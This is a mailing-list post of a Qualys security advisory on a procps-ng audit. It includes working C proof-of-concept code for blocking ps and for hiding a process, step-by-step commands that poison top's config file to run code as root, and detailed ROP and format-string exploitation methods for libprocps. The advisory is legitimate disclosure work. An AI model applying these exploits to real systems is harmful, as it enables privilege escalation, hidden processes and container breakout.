  oss-security - Qualys Security Advisory - Procps-ng Audit Report            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 17 May From: Qualys Security Advisory <qsa@...lys.com> To: oss-security@...ts.openwall.com Subject: Qualys Security Advisory - Procps-ng Audit Report   Qualys Security Advisory  Procps-ng Audit Report   ======================================================================== Contents ========================================================================  Summary 1. FUSE-backed /proc/PID/cmdline 2. Unprivileged process hiding 3. Local Privilege Escalation in top (Low Impact) 4. Denial of Service in ps 5. Local Privilege Escalation in libprocps (High Impact)    5.1. Vulnerability    5.2. Exploitation    5.3. Exploitation details    5.4. Non-PIE exploitation    5.5. PIE exploitation Acknowledgments Patches.tar.gz.b64   ======================================================================== Summary ========================================================================  We performed a complete audit of procps-ng, the "command line and full screen utilities for browsing procfs, a 'pseudo' file system dynamically generated by the [Linux] kernel to provide information about the status of entries in its process table" (https://gitlab.com/procps-ng/procps). procps-ng contains the utilities free, kill, pgrep, pidof, pkill, pmap, ps, pwdx, skill, slabtop, snice, sysctl, tload, top, uptime, vmstat, w, watch, and the necessary libprocps library.  We discovered and submitted patches for more than a hundred bugs and vulnerabilities in procps-ng; for reference, our patches are available at:   and base64-encoded at the end of this advisory. In the remainder of this advisory, we present our most interesting findings:  1. FUSE-backed /proc/PID/cmdline    An attacker can block any read() access to /proc/PID/cmdline by   mmap()ing a FUSE file (Filesystem in Userspace) onto this process's   command-line arguments. The attacker can therefore block pgrep, pidof,   pkill, ps, and w, either forever (a denial of service), or for some   controlled time (a synchronization tool for exploiting other   vulnerabilities).  2. Unprivileged process hiding    An unprivileged attacker can hide a process from procps-ng's   utilities, by exploiting either a denial of service (a rather noisy   method) or a race condition inherent in reading /proc/PID entries (a   stealthier method).  3. Local Privilege Escalation in top    top reads its configuration file from the current working directory,   without any security check, if the HOME environment variable is unset   or empty. In this very unlikely scenario, an attacker can carry out an   LPE (Local Privilege Escalation) if an administrator executes top in   /tmp (for example), by exploiting one of several vulnerabilities in   top's config_file() function.  4. Denial of Service in ps    An attacker can overflow the output buffer of ps, when executed by   another user, administrator, or script: a denial of service only (not   an LPE), because ps mmap()s its output buffer and mprotect()s its last   page with PROT_NONE (an effective guard page).  5. Local Privilege Escalation in libprocps    An attacker can exploit an integer overflow in libprocps's   file2strvec() function and carry out an LPE when another user,   administrator, or script executes a vulnerable utility (pgrep, pidof,   pkill, and w are vulnerable by default; other utilities are vulnerable   if executed with non-default options). Moreover, an attacker's process   running inside a container can trigger this vulnerability in a utility   running outside the container: the attacker can exploit this userland   vulnerability and break out of the container or chroot. We will   publish our proof-of-concept exploits in the near future.  Additionally, has been assigned to and to   ======================================================================== 1. FUSE-backed /proc/PID/cmdline ========================================================================  In this experiment, we add a sleep(60) to hello_read() in https://github.com/libfuse/libfuse/blob/master/example/hello.c and compile it, mount it on /tmp/fuse, and mmap() /tmp/fuse/hello onto the command-line arguments of a simple proof-of-concept:  $ gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello $ mkdir /tmp/fuse $ ./hello /tmp/fuse  $ cat > fuse-backed-cmdline.c << "EOF" #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/mman.h> #include <sys/stat.h> #include <sys/types.h> #include <unistd.h>  #define die() do { \     fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \     exit(EXIT_FAILURE); \ } while (0)  #define PAGESZ  int main(const int argc, const char * const argv[]) {     if (argc <= 0) die();     const char * const arg_start = argv[0];     const char * const last_arg = argv[argc-1];     const char * const arg_end = last_arg + strlen(last_arg) + 1;      if (arg_end <= arg_start) die();     const size_t len = arg_end - arg_start;     if (len < 2 * PAGESZ) die();      char * const addr = (char *)(((size_t)arg_start + PAGESZ-1) & ~(PAGESZ-1));     if (addr < arg_start) die();     if (addr + PAGESZ > arg_end) die();      const int fd = open("/tmp/fuse/hello", O_RDONLY);     if (fd <= -1) die();     if (mmap(addr, PAGESZ, PROT_READ, MAP_PRIVATE | MAP_FIXED, fd, 0) != addr) die();     if (close(fd)) die();      for (;;) {         sleep(1);     }     die(); } EOF $ gcc -Wall fuse-backed-cmdline.c -o fuse-backed-cmdline $ ./fuse-backed-cmdline `perl -e 'print "A" x  Then, if root executes ps (for example):  # time ps ax   PID TTY      STAT   TIME COMMAND ... real    user    sys       ======================================================================== 2. Unprivileged process hiding ========================================================================  Several procps-ng utilities (pgrep, pidof, pkill, ps, w) read the /proc/PID/cmdline of every process running on the system; hence, an unprivileged attacker can hide a process (albeit noisily) by exploiting a denial of service in procps-ng (for example, the FUSE-backed denial of service, or one of the integer overflows in file2strvec()).  Alternatively, we devised a stealthier method for hiding a process:  1/ fork() our process until it occupies the last PID (/proc/sys/kernel/pid_max - 1) or one of the last PIDs;  2/ monitor (with inotify) the /proc directory and the /proc/PID/stat file of one of the very first PIDs, for IN_OPEN events (opendir() and open());  3/ when these events occur (when a procps-ng utility starts scanning /proc for /proc/PID entries), fork() our process until its PID wraps around and occupies one of the very first PIDs;  4/ monitor (with inotify) the /proc directory for an IN_CLOSE_NOWRITE event (closedir());  5/ when this event occurs (when the procps-ng utility stops scanning /proc), go back to 1/.  This simple method works, because the kernel's proc_pid_readdir() function returns the /proc/PID entries in ascending numerical order. Moreover, this race condition can be made deterministic by using a FUSE-backed /proc/PID/cmdline as a synchronization tool.  $ cat > unprivileged-process-hiding.c << "EOF" #include <errno.h> #include <limits.h> #include <signal.h> #include <stdio.h> #include <stdlib.h> #include <sys/inotify.h> #include <sys/stat.h> #include <sys/types.h> #include <sys/wait.h> #include <unistd.h>  #define die() do { \     fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \     exit(EXIT_FAILURE); \ } while (0)  int main(void) {     for (;;) {         char lost[64];       {         const pid_t hi = getpid();         pid_t lo = fork();         if (lo <= -1) die();         if (!lo) { /* child */             lo = getpid();             if (lo < hi) exit(EXIT_SUCCESS); /* parent continues */             for (;;) {                 if (kill(hi, 0) != -1) continue;                 if (errno != ESRCH) die();                 break;             }             continue;         }         /* parent */         if (lo > hi) exit(EXIT_FAILURE); /* child continues */         int status = 0;         if (waitpid(lo, &status, 0) != lo) die();         if (!WIFEXITED(status)) die();         if (WEXITSTATUS(status) != EXIT_SUCCESS) die();          printf("%d -> %d -> ", hi, lo);         for (;;) {             struct stat st;             if (--lo <= 0) die();             snprintf(lost, sizeof(lost), "/proc/%d/stat", lo);             if (stat(lost, &st) == 0) break;         }         printf("%d\n", lo);       }          const int pofd = inotify_init();         if (pofd <= -1) die();         if (inotify_add_watch(pofd, "/proc", IN_OPEN) <= -1) die();          const int lofd = inotify_init();         if (lofd <= -1) die();         if (inotify_add_watch(lofd, lost, IN_OPEN) <= -1) die();          const int pcfd = inotify_init();         if (pcfd <= -1) die();         if (inotify_add_watch(pcfd, "/proc", IN_CLOSE_NOWRITE) <= -1) die();          char buf[sizeof(struct inotify_event) + NAME_MAX + 1];         const struct inotify_event * const evp = (void *)buf;          for (;;) {             if (read(pofd, buf, sizeof(buf)) < (ssize_t)sizeof(*evp)) die();             if (evp->mask & IN_ISDIR) break;         }          if (read(lofd, buf, sizeof(buf)) < (ssize_t)sizeof(*evp)) die();         for (;;) {             const pid_t hi = getpid();             pid_t lo = fork();             if (lo <= -1) die();             if (lo) exit(EXIT_SUCCESS); /* parent */             /* child */             lo = getpid();             if (lo < hi) {                 printf("%d -> %d\n", hi, lo);                 break;             }         }          for (;;) {             if (read(pcfd, buf, sizeof(buf)) < (ssize_t)sizeof(*evp)) die();             if (evp->mask & IN_ISDIR) break;         }          if (close(pofd)) die();         if (close(lofd)) die();         if (close(pcfd)) die();     }     die(); } EOF $ gcc -Wall unprivileged-process-hiding.c -o unprivileged-process-hiding $ ./unprivileged-process-hiding  Then, if root executes ps (for example):  # ps ax | grep '[u]nprivileged-process-hiding' | wc       0       0       0   ======================================================================== 3. Local Privilege Escalation in top ========================================================================  If a/ an administrator executes top in a directory writable by an attacker and b/ the HOME environment variable is unset or empty, then top reads its configuration file from the current working directory, without any security check:  static void configs_read (void) { ....    p_home = getenv("HOME");    if (!p_home || p_home[0] == '\0')       p_home = ".";    snprintf(Rc_name, sizeof(Rc_name), "%s/.%src", p_home, Myname);     if (!(fp = fopen(Rc_name, "r"))) { ....    if (fp) {       p = config_file(fp, Rc_name, &tmp_delay);  Although b/ is very unlikely, we developed a simple command-line method for exploiting one of the vulnerabilities in config_file(), when top is not a PIE (Position-Independent Executable). For example, on Ubuntu  $ file /usr/bin/top /usr/bin/top: ELF 64-bit LSB executable, version 1 (SYSV), dynamically linked, interpreter for GNU/Linux stripped  First, we dump a clean configuration file to /tmp/.toprc, by running top and pressing the 'W' key:  $ cd /tmp $ env -u HOME top W q  Second, we add an arbitrary "inspect" command to this configuration file (inspect commands are normally executed when the user presses the 'Y' key):  $ echo -e 'pipe\tname\tid>>/tmp/top.%d.%lx' >> .toprc  To execute our inspect command without user interaction, we will emulate the 'Y' key by jumping directly into inspection_utility(), at (the fflush(stdout) is INSP_BUSY's last instruction):  static void inspection_utility (int pid) { ....          case kbd_ENTER:             INSP_BUSY;             Insp_sel = &Inspect.tab[sel];             Inspect.tab[sel].func(Inspect.tab[sel].fmts, pid);          48 8b 3d 1c f8 20 00    mov           # <stdout>         e8 67 7f ff ff          callq  <fflush@plt>         48 63 05 2c f9 20 00    movslq        #         8b 74 24 74             mov            48 c1 e0 06             shl    $0x6,%rax         48 03 05 61 11 23 00    add           #         48 89 05 12 11 23 00    mov           #         48 8b 78 18             mov            ff 10                   callq  *(%rax)         5b                      pop    %rbx  To jump directly into inspection_utility(), we will take control of top's execution flow, by exploiting a vulnerability in config_file(). "sortindx" is read from the configuration file without any sanity check, and is later used by window_show() to access a struct FLD_t which contains a function pointer "sort":  static int window_show (WIN_t *q, int wmax) { ....       qsort(q->ppt, Frame_maxtask, sizeof(proc_t*), Fieldstab[q->rc.sortindx].sort);          ba 08 00 00 00          mov    $0x8,%edx         48 c1 e0 05             shl    $0x5,%rax         48 8b 88 30 99 61 00    mov            e8 7a 47 ff ff          callq  <qsort@plt>  To take control of this function pointer, we will write LSW (Least Significant Word, 32 bits) into "graph_mems" and MSW (Most Significant Word, 32 bits) into "summclr", which are read from the configuration file and written to (and a memory location accessible by  static const char *config_file (FILE *fp, const char *name, float *delay) { ....       if (3 > fscanf(fp, "\twinflags=%d, sortindx=%d, maxtasks=%d, graph_cpus=%d, graph_mems=%d\n"          , &w->rc.winflags, &w->rc.sortindx, &w->rc.maxtasks, &w->rc.graph_cpus, &w->rc.graph_mems))             return p;       if (4 != fscanf(fp, "\tsummclr=%d, msgsclr=%d, headclr=%d, taskclr=%d\n"          , &w->rc.summclr, &w->rc.msgsclr          , &w->rc.headclr, &w->rc.taskclr))             return p;          4d 8d b5 30 ed 63 00    lea      .......         41 56                   push   %r14   .......         e8 d8 b7 ff ff          callq  <fscanf@plt>   .......         49 8d 95 34 ed 63 00    lea      .......         e8 a6 b7 ff ff          callq  <fscanf@plt>  Next, we modify the configuration file's "graph_mems", "summclr", and "sortindx" accordingly:  $ sed -i .toprc  $ sed -i .toprc  $ sed -i .toprc  Last, we turn off the View_MEMORY bit in the configuration file's "winflags", to prevent summary_show() from crashing because of our out-of-bounds "graph_mems":  #define View_MEMORY      // 'm' - display memory summary  static void summary_show (void) { ....    if (isROOM(View_MEMORY, 2)) { ....       if (w->rc.graph_mems) { ....          ix = w->rc.graph_mems - 1; ....          snprintf(util, sizeof(util), gtab[ix].swap, (int)((pct_swap * Graph_adj) + .5), gtab[ix].type);  $ winflags=`grep -m 1 winflags= .toprc | sed $ sed -i .toprc  Then, if an administrator executes top in /tmp, without a HOME environment variable (or with an empty HOME environment variable):  # cat /tmp/top.* cat: '/tmp/top.*': No such file or directory  # cd /tmp # env -u HOME top ...         signal 11 (SEGV) was caught by top, please         see http://www.debian.org/Bugs/Reporting Segmentation fault (core dumped)  # cat /tmp/top.* uid=0(root) gid=0(root) groups=0(root)   ======================================================================== 4. Denial of Service in ps ========================================================================  ps's functions pr_args(), pr_comm(), and pr_fname() are vulnerable to an mmap-based buffer overflow of outbuf (ps's output buffer):   static int pr_args(char *restrict const outbuf, const proc_t *restrict const pp){    char *endp = outbuf;    int rightward = max_rightward;    int fh = forest_helper(outbuf);      endp += fh;    rightward -= fh;      if(pp->cmdline && !bsd_c_option)      endp += escaped_copy(endp, *pp->cmdline, OUTBUF_SIZE, &rightward);    else      endp += escape_command(endp, pp, OUTBUF_SIZE, &rightward, ESC_DEFUNCT);      if(bsd_e_option && rightward>1) {      if(pp->environ && *pp->environ) {        *endp++ = ' ';        rightward--;        endp += escape_strlist(endp, pp->environ, OUTBUF_SIZE, &rightward);      }    }    return max_rightward-rightward;  }  The number of bytes written to endp by the escape*() functions is added to endp (a pointer into outbuf), but never subtracted from OUTBUF_SIZE. Normally "rightward" prevents this buffer overflow, because the maximum number of "cells" written to outbuf is OUTBUF_SIZE, and is equal to the number of "bytes" written to outbuf; but not in escape_str_utf8():   36 static int escape_str_utf8(char *restrict dst, const char *restrict src, int bufsize, int *maxcells){  ..  50     if (!(len = mbrtowc (&wc, src, MB_CUR_MAX, &s)))  ..  78       int wlen = wcwidth(wc);  ..           memcpy(dst, src, len);           my_cells += wlen;           dst += len;           my_bytes += len;           src += len;  For example, in the "en_US.UTF-8" locale, the multibyte sequence consumes 4 bytes, but only 1 cell, and an easy trigger for one of the outbuf overflows is:  $ (A=`python -c 'print * exec -a `python -c 'print "A" * sleep 60) & [1]  # env LANG=en_US.UTF-8 ps awwe   PID TTY      STAT   TIME COMMAND ... Signal 11 (SEGV) caught by ps (procps-ng version  pts/0    S      please report this bug Segmentation fault  This buffer overflow is a denial of service only (not an LPE), because ps mmap()s outbuf and mprotect()s its last page with PROT_NONE (an effective guard page):  void init_output(void){ ....   outbuf = mmap(     0,     page_size * (outbuf_pages+1), // 1 more, for guard page at high addresses     PROT_READ | PROT_WRITE,     MAP_PRIVATE | MAP_ANONYMOUS,     -1,     0   ); ....   mprotect(outbuf + page_size*outbuf_pages, page_size, PROT_NONE); // guard page   ======================================================================== 5. Local Privilege Escalation in libprocps ========================================================================  ======================================================================== 5.1. Vulnerability ========================================================================  libprocps's file2strvec() function parses a process's /proc/PID/cmdline (or /proc/PID/environ), and creates an in-memory copy of this process's argv[] (command-line argument strings, and pointers to these strings). file2strvec() is called when either PROC_FILLCOM or PROC_FILLARG, but not PROC_EDITCMDLCVT, is passed to openproc() or readproctab() (or PROC_FILLENV but not PROC_EDITENVRCVT).  file2strvec() is vulnerable to three integer overflows (of "tot", "c", and "tot + c + align"):   static char** file2strvec(const char* directory, const char* what) {      char     /* read buf bytes at a time */      char *p, *rbuf = 0, *endbuf, **q, **ret;      int fd, tot = 0, n, c, end_of_file = 0;      int align;  ...      /* read whole file into a memory buffer, allocating as we go */      while ((n = read(fd, buf, sizeof buf - 1)) >= 0) {  ...          rbuf = xrealloc(rbuf, tot + n);         /* allocate more memory */          memcpy(rbuf + tot, buf, n);             /* copy buffer into it */          tot += n;                               /* increment total byte ctr */  ...      endbuf = rbuf + tot;                        /* count space for pointers */      align = (sizeof(char*)-1) - ((tot + sizeof(char*)-1) & (sizeof(char*)-1));      for (c = 0, p = rbuf; p < endbuf; p++) {          if (!*p || *p == '\n')              c += sizeof(char*);  ...      c += sizeof(char*);                         /* one extra for NULL term */        rbuf = xrealloc(rbuf, tot + c + align);     /* make room for ptrs AT END */  To the best of our knowledge, the integer overflows of "c" and "tot + c + align" are not exploitable beyond a denial of service: they result in an mmap-based buffer overflow of rbuf, but with pointers only (pointers to our command-line argument strings, and a NULL terminator). Similarly, we were unable to exploit the integer overflow of "tot" on 32-bit.  On 64-bit, however, the integer overflow of "tot" results in a memcpy() of arbitrary bytes (our command-line arguments) to an offset of roughly -2GB below rbuf. Surprisingly, the "xrealloc(rbuf, tot + n)" before the memcpy() does not exit() when "tot" becomes negative, because xrealloc() incorrectly uses an "unsigned int size" argument instead of a size_t   66 void *xrealloc(void *oldp, unsigned int size) {  ======================================================================== 5.2. Exploitation ========================================================================  To exploit the integer overflow of "tot" on 64-bit, we are faced with several difficulties:  - We must defeat NX, ASLR, PIE, full RELRO, SSP (Stack-Smashing   Protector), and FORTIFY.  - Our exploit must be one-shot, or as close to one-shot as possible: we   may use brute-force if the target procps-ng utility is executed by a   script, but we have only one chance to exploit this vulnerability if   the target utility is executed manually by an administrator.  - We have no control over the target utility's command-line arguments,   environment variables, or resource limits (it is executed by another   user, administrator, or script), and we have no direct channel for an   information leak (we have no access to the target utility's output,   for example).  - We were unable to exploit the integer overflow of "tot" when rbuf is   mmap()ed (but we were also unable to prove that it is unexploitable);   when the integer "tot" overflows, rbuf is an mmap()ed chunk (its size   is roughly 2GB), and because Linux's mmap() is a top-down allocator,   we believe that:    . rbuf must be allocated in a hole of the mmap-space (to survive the     memcpy() at a negative offset below rbuf);    . it is impossible to make such a large hole (in procps-ng, calls to     the malloc functions are extremely rare).  Despite these difficulties, we developed proof-of-concept exploits against the procps-ng utility "w" on Ubuntu (a one-shot exploit against a partial RELRO, non-PIE w), Debian 9 and Fedora 27 (a nearly one-shot exploit against a full RELRO, PIE w): if we first force "w" to malloc()ate n_mmaps_max = 64K mmap()ed chunks (whose size is larger than mmap_threshold = then malloc() will not call mmap() anymore, but will call brk() instead, even for chunks larger than mmap_threshold. The 2GB rbuf (after the integer overflow of tot) will therefore be allocated on the heap by brk(), and because brk() is a bottom-up allocator, we can easily arrange for the memcpy() at rbuf - 2GB to overwrite the beginning of the heap:  - if w is not a PIE, we overwrite libprocps's internal PROCTAB structure   and its function pointers;  - if w is a PIE, we overwrite the glibc's internal *gettext() structures   and transform this memory corruption into a format-string exploit.  To force 64K allocations of (8GB) in w, we need 64K distinct PIDs (each /proc/PID/cmdline allocates in file2strvec()): consequently, /proc/sys/kernel/pid_max must be greater than 64K (it is 32K by default, even on 64-bit). This is not an unusual setting: large servers (database servers, container and storage platforms) commonly increase the value of pid_max (up to 4M on 64-bit). Besides pid_max, other settings may limit our ability to spawn 64K processes: /proc/sys/kernel/threads-max, RLIMIT_NPROC, and systemd-logind's UserTasksMax. Unlike pid_max, however, these limits are not insuperable obstacles:  - they may be naturally greater than 64K, depending on the total number   of RAM pages (for /proc/sys/kernel/threads-max and RLIMIT_NPROC) or   the value of pid_max (for UserTasksMax);  - they may not apply to the attacker's user account (for example,   systemd-logind may not at all manage this specific user account);  - in any case, we do not need to spawn 64K concurrent processes: if we   use /proc/PID/cmdline as a FUSE-backed synchronization tool, we need   only a few concurrent processes.  ======================================================================== 5.3. Exploitation details ========================================================================  Our proof-of-concept exploit spawns five different types of processes ("main", "mmap", "dist", "wrap", and "srpt"):  - a long-lived "main" process, which spawns and coordinates the other   processes;  - 64K long-lived "mmap" processes, which guarantee that the ~2GB rbufs   of our "dist" and "wrap" processes are allocated by brk() in the heap   of our future "w" target; the "mmap" processes occupy the lowest PIDs   available, to avoid interference from other processes with the heap   layout of w;  - a long-lived "dist" ("distance") process, whose /proc/PID/cmdline is   carefully constructed to cover the exact distance between our target   structure (at the beginning of w's heap) and the rbuf of our "wrap"   process (at the end of w's heap);  - a long-lived "wrap" ("integer wrap") process, which overflows the   integer "tot" and overwrites our target structure at the beginning of   w's heap (with the memcpy() at rbuf - 2GB);  - short-lived "srpt" ("simulate readproctab") processes, which measure   the exact distance between our target structure (at the beginning of   w's heap) and the rbuf of our "wrap" process (at the end of w's heap);   because this distance depends on an accurate list of processes running   on the system, our exploit regularly spawns "srpt" processes until the   distance stabilizes (it is particularly unstable after a reboot).  We use a few noteworthy tricks in this exploit:  - we do not fork() but clone() the "mmap" processes (we use the flags   CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | CLONE_SIGHAND, but   not CLONE_THREAD, because each process must have its own /proc/PID   entry): this is much faster, and significantly reduces the memory   consumption of our exploit (the target "w" process itself already   consumes over 12GB = + 2GB + 2GB -- the rbufs for the   "mmap", "dist", and "wrap" processes);  - we analyze the ~2GB command-line argument strings of our "dist" and   "wrap" processes, to detect repeated patterns and replace them with   our equivalent file-backed mmap()s (this further reduces the memory   consumption of the exploit); moreover, we replace the argv[] pointers   of these processes with PROT_NONE mmap()s (hundreds of megabytes that   are never accessed);  - we initially simulated readproctab() with our own exploit code, but   eventually switched to a small LD_PRELOAD library that instruments the   real "w" utility and provides more accurate measurements.  There is much room for improvement in this proof-of-concept exploit: for example, it depends on the exact distance between our target structure (at the beginning of w's heap) and the rbuf of our "wrap" process (at the end of w's heap), but this distance is hard to measure inside a container, because processes running outside the container are not visible inside the container (brute-force may be a solution if the target utility is executed by a script, but not if it is executed manually by an administrator; better solutions may exist).  ======================================================================== 5.4. Non-PIE exploitation ========================================================================  In this section, we describe our simplest proof-of-concept exploit, against the non-PIE "w" on Ubuntu we overflow the integer "tot" in file2strvec(), we overwrite the PROCTAB structure and its function pointers, and we jump into the executable segment of w. However, w is very small and contains no useful gadgets, syscall instructions, or library calls. Instead, we use a technique pioneered by Nergal in ("5 - The dynamic linker's dl-resolve() function"):  We jump to the very beginning of w's PLT (Procedure Linkage Table), which calls _dl_runtime_resolve() and _dl_fixup() with a "reloc_arg" that we control (it is read from the stack) and that indexes our own fake Elf64_Rela structure (in w's heap), which in turn indexes a fake Elf64_Sym structure, which in turn indexes a string that we control and that allows us to call any library function, by name (even if it does not appear in w's PLT). The obvious choice here is the "system" function:  - the RDI register (the first argument of the function pointer that we   overwrote, and hence the command argument of system()) points to the   PROCTAB structure, whose contents we control;  - we do not need to worry about the privilege dropping of /bin/sh,   because w is not a set-user-ID executable.  Finally, we must solve two practical problems to use this dynamic-linker technique against w:  - our fake ELF structures are located in the heap, but indexed from the   executable, and a random gap separates the heap from the executable:   we therefore allocate four large areas in the heap (large enough to   defeat the randomization of the heap), one for each of our fake   structures (Elf64_Rela, Elf64_Sym, "system", and ndx for symbol   versioning);  - malloc guarantees a 16-byte alignment, but Elf64_Rela and Elf64_Sym   are 24-byte structures: luckily, the last 8 bytes of these structures   are unused, and we therefore truncate our fake structures to 16 bytes.  For example, on Ubuntu we overwrite the PROCTAB structure with the following ROP chain:    procfs  taskdir  tdu  df   finder   reader  tfinder |--------|--------|----+---|--------|--------|--------|------|--------|--------| | id>>/tmp/w.$$        .... |--------|--------|----+---|--------|--------|--------|------|--------|--------|                                                     0xffb8 bytes  - the first gadget that we execute, pivots the stack pointer   to RDI (which points to the very beginning of the PROCTAB structure):   "push rdi; ...; pop rsp; pop r13; pop r14; pop r15; pop rbp; ret;"  - the second gadget that we execute, increases the stack   pointer by 0xffb8 bytes (it would otherwise crash into the beginning   of the heap, because the stack grows down): "ret 0xffb8;"  - the third gadget that we execute, calls   _dl_runtime_resolve() and _dl_fixup() with our own "relocarg" (this   effectively calls system() with the command located at RDI,   "id>>/tmp/w.$$"):          ff 35 02 2f 20 00       pushq          ff 25 04 2f 20 00       jmpq    - the fourth gadget that we execute, makes a clean exit:          bf 01 00 00 00          mov    $0x1,%edi         e8 36 e7 ff ff          callq  <_exit@plt>  $ ./w-exploit-Non-PIE positive_tot distance_tot distance ... distance off ver_beg  ver_end  rel_beg rel_end str_beg str_end sym_beg sym_end reloc_arg nentries 5 POSITIVE_TOT DISTANCE_TO_PT 1 negwrite_off nentries 1 ready  Then, if an administrator executes w:  # cat /tmp/w.* cat: '/tmp/w.*': No such file or directory  # w  # cat /tmp/w.* uid=0(root) gid=0(root) groups=0(root)  ======================================================================== 5.5. PIE exploitation ========================================================================  In this section, we describe our proof-of-concept exploit against the PIE "w" on Debian 9 and Fedora 27. The first technique that we tried, a partial overwrite of a function pointer in the PROCTAB structure, does not work:  - we are limited to a 2-byte overwrite, or else we lose the "one-shot"   quality of our exploit (we must brute-force the random bits that we   overwrite);  - the original function pointer refers to a piece of code in libprocps   that offers a very limited choice of gadgets;  - file2strvec() ends our command-line argument strings (which overwrite   the function pointer) with a null byte, and further reduces the number   of available gadgets.  Our second, working technique is derived from halfdog's fascinating and transforms libprocps's integer overflow and memory corruption into a format-string exploit:  - we overwrite the dirname pointer to "/usr/share/locale" (a member of   the struct binding malloc()ated at the very beginning of w's heap by   bindtextdomain()) with a pointer to "/tmp" -- we do not need to worry   about ASLR, because we arrange for file2strvec() to overwrite dirname   with a pointer to our command-line argument strings; alternatively, we   could overwrite the "procps-ng" string (malloc()ated at the beginning   of w's heap by textdomain()), but this would also overwrite the chunk   header of the struct PROCTAB, and would cause a crash in closeproc();  - we thereby control the translation strings returned by the *gettext()   functions and the _() macro (the overwritten dirname pointer is used   to construct the names of the translation files ".mo") and therefore   control two format-strings in w's main():                  printf(_("%-*s TTY      "), userlen, _("USER")); ...                         printf(_("  LOGIN@   IDLE   JCPU   PCPU WHAT\n"));  - we exploit the first format-string to create a pointer to a saved RIP   on the stack, and we write this pointer to the stack itself;  - we use this pointer, and the second format-string, to overwrite the   saved RIP with the address of a useful libc gadget (we return into   popen() on Debian 9, and wordexp() on Fedora 27).  However, unlike halfdog, we cannot defeat ASLR by simply dumping the contents of the stack with a format-string, because we have not access to the output of "w" (it is executed by another user, administrator, or script). Instead, we implement Chris Evans's "read-add-write" primitive ("Trick #6: co-opting an addition primitive") with format-strings only.  With the first format-string:  - we "read" the LSW (Least Significant Word, 32 bits) of a stack pointer   that is located on the stack itself and hence accessible through the   format-string arguments -- for example, the argv pointer;  - we "add" a distribution-specific constant to this LSW, to make it   point to a saved RIP on the stack -- for example, the saved RIP pushed   onto the stack by the call to printf_positional() in vfprintf();  - we "write" this modified LSW to the LSW of another stack pointer that   is also located on the stack itself and hence accessible through the   format-string arguments -- for example, the argv[0] pointer.  With the second format-string:  - we "read" the LSW of a libc pointer that is located on the stack and   hence accessible through the format-string arguments -- for example,   the pointer to __libc_start_main();  - we "add" a distribution-specific constant to this LSW, to make it   point to a useful libc gadget -- for example, popen() or wordexp();  - we "write" this modified LSW to the LSW of a saved RIP on the stack:   we use the pointer (to the saved RIP) created on the stack by the   first format-string.  To implement the "read-add-write" primitive:  - we "read" the LSW of a pointer (we load it into vfprintf's internal   character counter) through a variable-width specifier such as "%*R$x",   where R is the position (among the format-string arguments on the   stack) of the to-be-read pointer;  - we "add" a constant A to this LSW through a constant-width specifier   such as "%Ax";  - we "write" this modified LSW to the LSW of another pointer through a   specifier such as "%W$n", where W is the position (among the format-   string arguments on the stack) of a pointer to the to-be-overwritten   pointer (for example, in our first format-string we overwrite the LSW   of the argv[0] pointer through the argv pointer, and in our second   format-string we overwrite the LSW of a saved RIP through the   overwritten argv[0] pointer); in summary:    . if we want to "add" a constant to the LSW that we "read", we use a     simple format-string such as "%*R$x%Ax%W$n", where A is equal to the     constant that we want to add;    . if we want to "subtract" a constant from the LSW that we "read", we     use a format-string such as "%*R$x%W$n%Ax%W$hn", where A is equal to     minus the constant that we want to subtract (the smaller the     constant, the higher the probability of success).  This generic technique defeats NX, ASLR, PIE, SSP, and FORTIFY, but it suffers from three major drawbacks:  - it requires two different format-strings, because it must reset   vfprintf's internal character counter between the two "read-add-write"   primitives;  - its probability of success is 1/4 (not a one-shot, but not a   brute-force either), because the probability of success of each   "read-add-write" primitive is 1/2 (the randomized LSW that is "read"   as an "int width" must be positive), and the stack is randomized   independently of the libc;  - it outputs 2*1GB on average (2*2GB at most): this may be acceptable if   the target utility is executed by a script or daemon, but not if it is   executed manually by an administrator (terminal escape sequences may   be used to overcome this drawback, but we did not explore this   possibility yet).  It is also possible to implement distribution-specific variants of this generic technique: for example, we developed a Debian-specific version of our "w" exploit that requires only one format-string, has an probability of success (nearly one-shot), and outputs only a few kilobytes. This is left as an exercise for the interested reader.   ======================================================================== Acknowledgments ========================================================================  We thank Craig Small and the members of linux-distros@...nwall and security@...nel.   ======================================================================== Patches.tar.gz.b64 ========================================================================  lKEMZShDGcpQhjKUoQxlKEMZylCGMvzFwn8BIngbjwCwBAA=   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      